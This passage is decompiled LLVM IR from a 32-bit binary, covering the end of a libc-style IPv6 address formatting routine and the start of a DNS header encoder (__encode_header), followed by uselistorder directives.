  %v0_8053ae38 = phi i32 [ -1, %dec_label_pc_8053ae3 ], [ %v0_8053ae370, %dec_label_pc_8053ae0 ], [ %v0_8053af871, %dec_label_pc_8053ad7 ], [ -1, %dec_label_pc_8053af5 ]
  %v0_8053ae89 = phi i32 [ %v0_8053b0369, %dec_label_pc_8053ae3 ], [ %v0_8053b0369, %dec_label_pc_8053ae0 ], [ %v0_8053b0369, %dec_label_pc_8053ad7 ], [ %v0_8053ae811, %dec_label_pc_8053af5 ]
  %v1_8053af8 = add nuw nsw i32 %v0_8053af871, 1
  store i32 %v1_8053af8, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8053af8, 8
  br i1 %exitcond, label %dec_label_pc_8053afe, label %dec_label_pc_8053acb

dec_label_pc_8053afe:                             ; preds = %dec_label_pc_8053af8
  %v10_8053afe = icmp eq i32 %v0_8053af313, -1
  br i1 %v10_8053afe, label %dec_label_pc_8053b10, label %dec_label_pc_8053b03

dec_label_pc_8053b03:                             ; preds = %dec_label_pc_8053afe
  %v10_8053b03 = icmp eq i32 %v0_8053ae89, -1
  %v0_8053b0c.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8053b03, label %dec_label_pc_8053b0c, label %dec_label_pc_8053b08

dec_label_pc_8053b08:                             ; preds = %dec_label_pc_8053b03
  %v1_8053b08 = load i32, i32* @ebp, align 4
  %v7_8053b0a = icmp sgt i32 %v0_8053b0c.pre, %v1_8053b08
  br i1 %v7_8053b0a, label %dec_label_pc_8053b0c, label %dec_label_pc_8053b10.thread

dec_label_pc_8053b10.thread:                      ; preds = %dec_label_pc_8053b08
  br label %dec_label_pc_8053b15

dec_label_pc_8053b0c:                             ; preds = %dec_label_pc_8053b03, %dec_label_pc_8053b08
  store i32 %v0_8053b0c.pre, i32* @ebp, align 4
  store i32 %v0_8053af313, i32* @edi, align 4
  br label %dec_label_pc_8053b10

dec_label_pc_8053b10:                             ; preds = %dec_label_pc_8053afe, %dec_label_pc_8053b0c
  %v0_8053b10 = phi i32 [ %v0_8053ae89, %dec_label_pc_8053afe ], [ %v0_8053af313, %dec_label_pc_8053b0c ]
  %v10_8053b10 = icmp eq i32 %v0_8053b10, -1
  br i1 %v10_8053b10, label %dec_label_pc_8053b1d, label %dec_label_pc_8053b10.dec_label_pc_8053b15_crit_edge

dec_label_pc_8053b10.dec_label_pc_8053b15_crit_edge: ; preds = %dec_label_pc_8053b10
  %v0_8053b15.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8053b15

dec_label_pc_8053b15:                             ; preds = %dec_label_pc_8053b10.dec_label_pc_8053b15_crit_edge, %dec_label_pc_8053b10.thread
  %v0_8053b15 = phi i32 [ %v1_8053b08, %dec_label_pc_8053b10.thread ], [ %v0_8053b15.pre, %dec_label_pc_8053b10.dec_label_pc_8053b15_crit_edge ]
  %v0_8053b1049 = phi i32 [ %v0_8053ae89, %dec_label_pc_8053b10.thread ], [ %v0_8053b10, %dec_label_pc_8053b10.dec_label_pc_8053b15_crit_edge ]
  %v1_8053b15 = add i32 %v0_8053b15, -1
  %v6_8053b15 = sub i32 0, %v0_8053b15
  %v7_8053b15 = and i32 %v0_8053b15, %v6_8053b15
  %v8_8053b15 = icmp slt i32 %v7_8053b15, 0
  %v9_8053b15 = icmp eq i32 %v1_8053b15, 0
  %v10_8053b15 = icmp slt i32 %v1_8053b15, 0
  %v3_8053b18 = icmp eq i1 %v10_8053b15, %v8_8053b15
  %v4_8053b18 = icmp eq i1 %v9_8053b15, false
  %v5_8053b18 = and i1 %v4_8053b18, %v3_8053b18
  br i1 %v5_8053b18, label %dec_label_pc_8053b1d, label %dec_label_pc_8053b1a

dec_label_pc_8053b1a:                             ; preds = %dec_label_pc_8053b15
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8053b1d

dec_label_pc_8053b1d:                             ; preds = %dec_label_pc_8053b15, %dec_label_pc_8053b10, %dec_label_pc_8053b1a
  %v0_8053bbd18 = phi i32 [ %v0_8053b1049, %dec_label_pc_8053b15 ], [ -1, %dec_label_pc_8053b10 ], [ -1, %dec_label_pc_8053b1a ]
  %v2_8053b1d = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8053b1d, i32* @ebx, align 4
  %v3_8053b9f = add i32 %v4_8053a7f, 64
  %v12_8053b5d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8053bbd61 = icmp eq i32 %v0_8053bbd18, -1
  %v1_8053b65 = icmp eq i1 %v12_8053b5d, false
  br label %dec_label_pc_8053b28

dec_label_pc_8053b28:                             ; preds = %dec_label_pc_8053b1d, %dec_label_pc_8053bb3
  %v10_8053bbd67 = phi i1 [ %v10_8053bbd61, %dec_label_pc_8053b1d ], [ %v10_8053bbd, %dec_label_pc_8053bb3 ]
  %v0_8053b4266 = phi i32 [ 0, %dec_label_pc_8053b1d ], [ %v1_8053bb3, %dec_label_pc_8053bb3 ]
  %v1_8053b3865 = phi i32 [ %v0_8053bbd18, %dec_label_pc_8053b1d ], [ %v0_8053bbd.pre, %dec_label_pc_8053bb3 ]
  %v0_8053b4664 = phi i32 [ %v2_8053b1d, %dec_label_pc_8053b1d ], [ %v0_8053b3c19, %dec_label_pc_8053bb3 ]
  %stack_var_-120.163 = phi i8* [ null, %dec_label_pc_8053b1d ], [ %stack_var_-120.0, %dec_label_pc_8053bb3 ]
  %stack_var_-116.162 = phi i32 [ 32, %dec_label_pc_8053b1d ], [ %stack_var_-116.0, %dec_label_pc_8053bb3 ]
  br i1 %v10_8053bbd67, label %dec_label_pc_8053b42, label %dec_label_pc_8053b2d

dec_label_pc_8053b2d:                             ; preds = %dec_label_pc_8053b28
  %v12_8053b2d = icmp eq i32 %v0_8053b4266, %v1_8053b3865
  %v5_8053b2f = icmp slt i32 %v0_8053b4266, %v1_8053b3865
  br i1 %v5_8053b2f, label %dec_label_pc_8053b42, label %dec_label_pc_8053b31

dec_label_pc_8053b31:                             ; preds = %dec_label_pc_8053b2d
  %v1_8053b31 = load i32, i32* @ebp, align 4
  %v2_8053b31 = add i32 %v1_8053b31, %v1_8053b3865
  store i32 %v2_8053b31, i32* %eax.global-to-local, align 4
  %v5_8053b36 = icmp slt i32 %v0_8053b4266, %v2_8053b31
  br i1 %v5_8053b36, label %dec_label_pc_8053b38, label %dec_label_pc_8053b42

dec_label_pc_8053b38:                             ; preds = %dec_label_pc_8053b31
  %v1_8053b3a = icmp eq i1 %v12_8053b2d, false
  br i1 %v1_8053b3a, label %dec_label_pc_8053bb3, label %dec_label_pc_8053b3c

dec_label_pc_8053b3c:                             ; preds = %dec_label_pc_8053b38
  %v1_8053b3c = inttoptr i32 %v0_8053b4664 to i8*
  store i8 58, i8* %v1_8053b3c, align 1
  %v0_8053b3f = load i32, i32* @ebx, align 4
  %v1_8053b3f = add i32 %v0_8053b3f, 1
  store i32 %v1_8053b3f, i32* @ebx, align 4
  br label %dec_label_pc_8053bb3

dec_label_pc_8053b42:                             ; preds = %dec_label_pc_8053b31, %dec_label_pc_8053b2d, %dec_label_pc_8053b28
  %v1_8053b42 = icmp eq i32 %v0_8053b4266, 0
  br i1 %v1_8053b42, label %dec_label_pc_8053b4a.thread, label %dec_label_pc_8053b4a

dec_label_pc_8053b4a.thread:                      ; preds = %dec_label_pc_8053b42
  br label %dec_label_pc_8053b9e

dec_label_pc_8053b4a:                             ; preds = %dec_label_pc_8053b42
  %v1_8053b46 = inttoptr i32 %v0_8053b4664 to i8*
  store i8 58, i8* %v1_8053b46, align 1
  %v0_8053b49 = load i32, i32* @ebx, align 4
  %v1_8053b49 = add i32 %v0_8053b49, 1
  store i32 %v1_8053b49, i32* @ebx, align 4
  %v0_8053b4a.pre = load i32, i32* @esi, align 4
  %v9_8053b4a = icmp eq i32 %v0_8053b4a.pre, 6
  %v1_8053b4d = icmp eq i1 %v9_8053b4a, false
  br i1 %v1_8053b4d, label %dec_label_pc_8053b9e, label %dec_label_pc_8053b4f

dec_label_pc_8053b4f:                             ; preds = %dec_label_pc_8053b4a
  %v0_8053b4f = load i32, i32* @edi, align 4
  %v1_8053b4f = icmp eq i32 %v0_8053b4f, 0
  %v1_8053b51 = icmp eq i1 %v1_8053b4f, false
  br i1 %v1_8053b51, label %dec_label_pc_8053b9e, label %dec_label_pc_8053b53

dec_label_pc_8053b53:                             ; preds = %dec_label_pc_8053b4f
  %v0_8053b53 = load i32, i32* @ebp, align 4
  %v9_8053b53 = icmp eq i32 %v0_8053b53, 6
  br i1 %v9_8053b53, label %dec_label_pc_8053b67, label %dec_label_pc_8053b58

dec_label_pc_8053b58:                             ; preds = %dec_label_pc_8053b53
  %v9_8053b58 = icmp eq i32 %v0_8053b53, 5
  %v1_8053b5b = icmp eq i1 %v9_8053b58, false
  br i1 %v1_8053b5b, label %dec_label_pc_8053b9e, label %dec_label_pc_8053b5d

dec_label_pc_8053b5d:                             ; preds = %dec_label_pc_8053b58
  br i1 %v1_8053b65, label %dec_label_pc_8053b9e, label %dec_label_pc_8053b67

dec_label_pc_8053b67:                             ; preds = %dec_label_pc_8053b5d, %dec_label_pc_8053b53
  %v2_8053b6d = sub i32 %v1_8053b49, %v2_8053b1d
  store i32 %v2_8053b6d, i32* @esi, align 4
  %v2_8053b78 = sub i32 46, %v2_8053b6d
  store i32 %v2_8053b78, i32* @ecx, align 4
  %v1_8053b7a = add i32 %arg2, 12
  store i32 %v1_8053b7a, i32* @eax, align 4
  store i32 %v1_8053b49, i32* @edx, align 4
  %v0_8053b7f = load i8*, i8** %stack_var_-124, align 4
  %v1_8053b7f = ptrtoint i8* %v0_8053b7f to i32
  %v3_8053b7f = ptrtoint i8* %stack_var_-120.163 to i32
  %v5_8053b7f = call i32 @inet_ntop4(i32 %v1_8053b7f, i32 %v3_8053b7f, i32 %stack_var_-116.162)
  store i32 %v5_8053b7f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8053b86 = icmp eq i32 %v5_8053b7f, 0
  br i1 %v1_8053b86, label %dec_label_pc_8053c10, label %dec_label_pc_8053b8e

dec_label_pc_8053b8e:                             ; preds = %dec_label_pc_8053b67
  %v0_8053b91 = load i32, i32* @ebx, align 4
  %v5_8053b91 = inttoptr i32 %v0_8053b91 to i8*
  store i8* %v5_8053b91, i8** %stack_var_-124, align 4
  %v3_8053b92 = call i32 @strlen(i8* %v5_8053b91)
  store i32 %v3_8053b92, i32* %eax.global-to-local, align 4
  %v0_8053b9a = load i32, i32* @ebx, align 4
  %v3_8053b9a = add i32 %v0_8053b9a, %v3_8053b92
  store i32 %v3_8053b9a, i32* @ebx, align 4
  %v0_8053bc2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053bc2

dec_label_pc_8053b9e:                             ; preds = %dec_label_pc_8053b4a.thread, %dec_label_pc_8053b5d, %dec_label_pc_8053b58, %dec_label_pc_8053b4f, %dec_label_pc_8053b4a
  %v1_8053b9f54 = phi i32 [ 0, %dec_label_pc_8053b4a.thread ], [ %v0_8053b4a.pre, %dec_label_pc_8053b5d ], [ %v0_8053b4a.pre, %dec_label_pc_8053b58 ], [ %v0_8053b4a.pre, %dec_label_pc_8053b4f ], [ %v0_8053b4a.pre, %dec_label_pc_8053b4a ]
  %v0_8053ba853 = phi i32 [ %v0_8053b4664, %dec_label_pc_8053b4a.thread ], [ %v1_8053b49, %dec_label_pc_8053b5d ], [ %v1_8053b49, %dec_label_pc_8053b58 ], [ %v1_8053b49, %dec_label_pc_8053b4f ], [ %v1_8053b49, %dec_label_pc_8053b4a ]
  %v0_8053b9e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8053b9e, i32* %stack_var_-112, align 4
  %v2_8053b9f = mul i32 %v1_8053b9f54, 4
  %v4_8053b9f = add i32 %v3_8053b9f, %v2_8053b9f
  %v5_8053b9f = inttoptr i32 %v4_8053b9f to i32*
  %v6_8053b9f = load i32, i32* %v5_8053b9f, align 4
  %v5_8053ba8 = inttoptr i32 %v0_8053ba853 to i8*
  store i8* %v5_8053ba8, i8** %stack_var_-124, align 4
  %v6_8053ba9 = call i32 @sprintf(i32 %v0_8053ba853, i32 ptrtoint ([3 x i8]* @global_var_80580b1.294 to i32), i32 %v6_8053b9f, i32 %v0_8053b9e)
  store i32 %v6_8053ba9, i32* %eax.global-to-local, align 4
  %v0_8053bb1 = load i32, i32* @ebx, align 4
  %v2_8053bb1 = add i32 %v0_8053bb1, %v6_8053ba9
  store i32 %v2_8053bb1, i32* @ebx, align 4
  br label %dec_label_pc_8053bb3

dec_label_pc_8053bb3:                             ; preds = %dec_label_pc_8053b38, %dec_label_pc_8053b3c, %dec_label_pc_8053b9e
  %stack_var_-116.0 = phi i32 [ %v6_8053b9f, %dec_label_pc_8053b9e ], [ %stack_var_-116.162, %dec_label_pc_8053b38 ], [ %stack_var_-116.162, %dec_label_pc_8053b3c ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80580b1.294, i32 0, i32 0), %dec_label_pc_8053b9e ], [ %stack_var_-120.163, %dec_label_pc_8053b38 ], [ %stack_var_-120.163, %dec_label_pc_8053b3c ]
  %v0_8053b3c19 = phi i32 [ %v2_8053bb1, %dec_label_pc_8053b9e ], [ %v0_8053b4664, %dec_label_pc_8053b38 ], [ %v1_8053b3f, %dec_label_pc_8053b3c ]
  %v0_8053bb3 = load i32, i32* @esi, align 4
  %v1_8053bb3 = add i32 %v0_8053bb3, 1
  %v0_8053bbd.pre = load i32, i32* @edi, align 4
  store i32 %v1_8053bb3, i32* @esi, align 4
  %v7_8053bb7 = icmp sgt i32 %v1_8053bb3, 7
  %v10_8053bbd = icmp eq i32 %v0_8053bbd.pre, -1
  br i1 %v7_8053bb7, label %dec_label_pc_8053bbd, label %dec_label_pc_8053b28

dec_label_pc_8053bbd:                             ; preds = %dec_label_pc_8053bb3
  br i1 %v10_8053bbd, label %dec_label_pc_8053bce, label %dec_label_pc_8053bc2

dec_label_pc_8053bc2:                             ; preds = %dec_label_pc_8053bbd, %dec_label_pc_8053b8e
  %v0_8053bca = phi i32 [ %v0_8053b3c19, %dec_label_pc_8053bbd ], [ %v3_8053b9a, %dec_label_pc_8053b8e ]
  %v0_8053bc2 = phi i32 [ %v0_8053bbd.pre, %dec_label_pc_8053bbd ], [ %v0_8053bc2.pre, %dec_label_pc_8053b8e ]
  %v1_8053bc2 = load i32, i32* @ebp, align 4
  %v2_8053bc2 = add i32 %v1_8053bc2, %v0_8053bc2
  store i32 %v2_8053bc2, i32* %eax.global-to-local, align 4
  %v9_8053bc5 = icmp eq i32 %v2_8053bc2, 8
  %v1_8053bc8 = icmp eq i1 %v9_8053bc5, false
  br i1 %v1_8053bc8, label %dec_label_pc_8053bce, label %dec_label_pc_8053bca

dec_label_pc_8053bca:                             ; preds = %dec_label_pc_8053bc2
  %v1_8053bca = inttoptr i32 %v0_8053bca to i8*
  store i8 58, i8* %v1_8053bca, align 1
  %v0_8053bcd = load i32, i32* @ebx, align 4
  %v1_8053bcd = add i32 %v0_8053bcd, 1
  store i32 %v1_8053bcd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053bce

dec_label_pc_8053bce:                             ; preds = %dec_label_pc_8053bc2, %dec_label_pc_8053bbd, %dec_label_pc_8053bca
  %v0_8053bd2 = phi i32 [ %v0_8053bca, %dec_label_pc_8053bc2 ], [ %v0_8053b3c19, %dec_label_pc_8053bbd ], [ %v1_8053bcd, %dec_label_pc_8053bca ]
  store i32 %v2_8053b1d, i32* %edx.global-to-local, align 4
  %v1_8053bd2 = add i32 %v0_8053bd2, 1
  store i32 %v1_8053bd2, i32* %eax.global-to-local, align 4
  %v1_8053bd5 = inttoptr i32 %v0_8053bd2 to i8*
  store i8 0, i8* %v1_8053bd5, align 1
  %v0_8053bd8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053bd8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053bd8 = sub i32 %v0_8053bd8, %v1_8053bd8
  store i32 %v2_8053bd8, i32* @eax, align 4
  %tmp78 = icmp ugt i32 %v2_8053bd8, %arg4
  br i1 %tmp78, label %dec_label_pc_8053be0, label %dec_label_pc_8053bed

dec_label_pc_8053be0:                             ; preds = %dec_label_pc_8053bce
  %v0_8053be0 = load i8*, i8** %stack_var_-124, align 4
  %v1_8053be0 = ptrtoint i8* %v0_8053be0 to i32
  %v2_8053be0 = call i32 @__errno_location(i32 %v1_8053be0)
  store i32 %v2_8053be0, i32* %eax.global-to-local, align 4
  %v1_8053be5 = inttoptr i32 %v2_8053be0 to i32*
  store i32 28, i32* %v1_8053be5, align 4
  br label %dec_label_pc_8053c0e

dec_label_pc_8053bed:                             ; preds = %dec_label_pc_8053bce
  %v0_8053bed = load i32, i32* @edi, align 4
  store i32 %v0_8053bed, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_8053bf02 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_8053bf02, i32* %tmp46, align 4
  %v0_8053bf7.cast = inttoptr i32 %v3_8053bf02 to i8*
  %v5_8053bf7 = call i32 @strcpy(i8* %v0_8053bf7.cast, i32 %v2_8053b1d)
  store i32 %v5_8053bf7, i32* %eax.global-to-local, align 4
  store i32 %v5_8053bf7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c10

dec_label_pc_8053c03:                             ; preds = %dec_label_pc_8053a5c
  %v1_8053c03 = call i32 @__errno_location(i32 %v0_8053a4f)
  store i32 %v1_8053c03, i32* %eax.global-to-local, align 4
  %v1_8053c08 = inttoptr i32 %v1_8053c03 to i32*
  store i32 97, i32* %v1_8053c08, align 4
  br label %dec_label_pc_8053c0e

dec_label_pc_8053c0e:                             ; preds = %dec_label_pc_8053be0, %dec_label_pc_8053c03
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c10

dec_label_pc_8053c10:                             ; preds = %dec_label_pc_8053b67, %dec_label_pc_8053bed, %dec_label_pc_8053a67, %dec_label_pc_8053c0e
  %v0_8053c13 = phi i32 [ 0, %dec_label_pc_8053b67 ], [ %v5_8053bf7, %dec_label_pc_8053bed ], [ %v3_8053a73, %dec_label_pc_8053a67 ], [ 0, %dec_label_pc_8053c0e ]
  store i32 %v0_8053c13, i32* %eax.global-to-local, align 4
  store i32 %v0_8053a4f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053c13

; uselistorder directives
  uselistorder i32 %v0_8053c13, { 1, 0 }
  uselistorder i32 %v0_8053bd2, { 1, 0 }
  uselistorder i32 %v1_8053bb3, { 1, 0, 2 }
  uselistorder i32 %v0_8053ba853, { 1, 0 }
  uselistorder i32 %v0_8053b4a.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8053b49, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.162, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.163, { 2, 1, 0 }
  uselistorder i32 %v0_8053b4664, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8053b3865, { 2, 0, 1 }
  uselistorder i32 %v0_8053b4266, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8053b1d, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8053b15, { 1, 0 }
  uselistorder i32 %v0_8053b15, { 1, 2, 0 }
  uselistorder i32 %v1_8053af8, { 0, 2, 1 }
  uselistorder i32 %v0_8053ae89, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053af313, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8053ae3, { 1, 0 }
  uselistorder i32 %v0_8053b0e68, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8053b0369, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053af871, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8053ab372, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8053a4f, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_80580b1.294, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 1, 0, 3, 4, 2 }
  uselistorder i32 64, { 6, 2, 0, 5, 7, 4, 1, 3 }
  uselistorder i32* @esp, { 0, 1, 72, 73, 74, 75, 76, 77, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 14, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 10, 258, 259, 260, 11, 261, 8, 262, 263, 264, 265, 266, 267, 12, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 9, 281, 282, 283, 284, 285, 286, 13, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 197, 2, 3, 315, 4, 5, 6, 15, 198, 199, 200, 201, 16, 202, 203, 204, 205, 206, 18, 207, 208, 209, 20, 210, 21, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 19, 223, 22, 224, 225, 226, 23, 227, 228, 229, 230, 231, 232, 233, 234, 17, 235, 108, 24, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 91, 7, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111, 112, 113, 114, 115, 116, 117, 121, 118, 119, 120, 122, 123, 125, 124, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 25, 141, 142, 143, 144, 145, 146, 26, 147, 148, 149, 150, 27, 151, 152, 153, 154, 155, 156, 157, 28, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 29, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 30, 66, 67, 68, 69, 70, 71, 236, 308, 309, 310, 311, 312, 313, 314 }
  uselistorder i32 15, { 0, 3, 9, 8, 1, 7, 2, 4, 5, 6 }
  uselistorder i32 60, { 4, 5, 2, 6, 7, 3, 0, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 7, 9, 10, 4, 15, 16, 13, 14, 5, 1, 2, 3, 8, 6, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053c10, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8053c0e, { 1, 0 }
  uselistorder label %dec_label_pc_8053bce, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053bb3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053b9e, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053b28, { 1, 0 }
  uselistorder label %dec_label_pc_8053b1d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053b10, { 1, 0 }
  uselistorder label %dec_label_pc_8053b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8053af8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053af5, { 1, 0 }
  uselistorder label %dec_label_pc_8053acb, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053c1d = load i32, i32* @ebx, align 4
  store i32 %v0_8053c1d, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8053c25 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8053c25, i32* %esi.global-to-local, align 4
  %v7_8053c2e = icmp sgt i32 %tmp, 11
  br i1 %v7_8053c2e, label %dec_label_pc_8053c34, label %dec_label_pc_8053cca

dec_label_pc_8053c34:                             ; preds = %entry
  %v1_8053c34 = add i32 %tmp9, 1
  %v2_8053c34 = inttoptr i32 %v1_8053c34 to i8*
  %v3_8053c34 = load i8, i8* %v2_8053c34, align 1
  store i8 %v3_8053c34, i8* %tmp8, align 1
  %v0_8053c3a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c3a = inttoptr i32 %v0_8053c3a to i32*
  %v2_8053c3a = load i32, i32* %v1_8053c3a, align 4
  %v1_8053c3c = trunc i32 %v2_8053c3a to i8
  %v2_8053c3c = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c3c = add i32 %v2_8053c3c, 1
  %v4_8053c3c = inttoptr i32 %v3_8053c3c to i8*
  store i8 %v1_8053c3c, i8* %v4_8053c3c, align 1
  %v0_8053c62 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c62 = add i32 %v0_8053c62, 8
  %v2_8053c62 = inttoptr i32 %v1_8053c62 to i32*
  %v3_8053c62 = load i32, i32* %v2_8053c62, align 4
  %v1_8053c65 = mul i32 %v3_8053c62, 8
  %v2_8053c6b = or i32 %v1_8053c65, 4
  %v1_8053c6d = add i32 %v0_8053c62, 20
  %v2_8053c6d = inttoptr i32 %v1_8053c6d to i32*
  %v3_8053c6d = load i32, i32* %v2_8053c6d, align 4
  %v4_8053c6d = icmp eq i32 %v3_8053c6d, 0
  %v1_8053c71 = icmp eq i1 %v4_8053c6d, false
  %v2_8053c71 = zext i1 %v1_8053c71 to i32
  %v2_8053c74 = or i32 %v2_8053c71, %v2_8053c6b
  %v2_8053c76 = or i32 %v2_8053c74, -126
  %v5_8053c76 = trunc i32 %v2_8053c76 to i8
  store i32 %v2_8053c76, i32* @ecx, align 4
  %v2_8053c78 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c78 = add i32 %v2_8053c78, 2
  %v4_8053c78 = inttoptr i32 %v3_8053c78 to i8*
  store i8 %v5_8053c76, i8* %v4_8053c78, align 1
  %v0_8053c7b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c81 = add i32 %v0_8053c7b, 28
  %v2_8053c81 = inttoptr i32 %v1_8053c81 to i8*
  %v3_8053c81 = load i8, i8* %v2_8053c81, align 1
  %tmp13 = urem i8 %v3_8053c81, 16
  %v2_8053c8c = or i8 %tmp13, -128
  %v2_8053c8e = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c8e = add i32 %v2_8053c8e, 3
  %v4_8053c8e = inttoptr i32 %v3_8053c8e to i8*
  store i8 %v2_8053c8c, i8* %v4_8053c8e, align 1
  %v0_8053c91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c91 = add i32 %v0_8053c91, 33
  %v2_8053c91 = inttoptr i32 %v1_8053c91 to i8*
  %v3_8053c91 = load i8, i8* %v2_8053c91, align 1
  %v2_8053c95 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c95 = add i32 %v2_8053c95, 4
  %v4_8053c95 = inttoptr i32 %v3_8053c95 to i8*
  store i8 %v3_8053c91, i8* %v4_8053c95, align 1
  %v0_8053c98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c98 = add i32 %v0_8053c98, 32
  %v2_8053c98 = inttoptr i32 %v1_8053c98 to i32*
  %v3_8053c98 = load i32, i32* %v2_8053c98, align 4
  %v1_8053c9b = trunc i32 %v3_8053c98 to i8
  %v2_8053c9b = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c9b = add i32 %v2_8053c9b, 5
  %v4_8053c9b = inttoptr i32 %v3_8053c9b to i8*
  store i8 %v1_8053c9b, i8* %v4_8053c9b, align 1
  %v0_8053c9e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c9e = add i32 %v0_8053c9e, 37
  %v2_8053c9e = inttoptr i32 %v1_8053c9e to i8*
  %v3_8053c9e = load i8, i8* %v2_8053c9e, align 1
  %v2_8053ca2 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053ca2 = add i32 %v2_8053ca2, 6
  %v4_8053ca2 = inttoptr i32 %v3_8053ca2 to i8*
  store i8 %v3_8053c9e, i8* %v4_8053ca2, align 1
  %v0_8053ca5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ca5 = add i32 %v0_8053ca5, 36
  %v2_8053ca5 = inttoptr i32 %v1_8053ca5 to i32*
  %v3_8053ca5 = load i32, i32* %v2_8053ca5, align 4
  %v1_8053ca8 = trunc i32 %v3_8053ca5 to i8
  %v2_8053ca8 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053ca8 = add i32 %v2_8053ca8, 7
  %v4_8053ca8 = inttoptr i32 %v3_8053ca8 to i8*
  store i8 %v1_8053ca8, i8* %v4_8053ca8, align 1
  %v0_8053cab = load i32, i32* %ebx.global-to-local, align 4
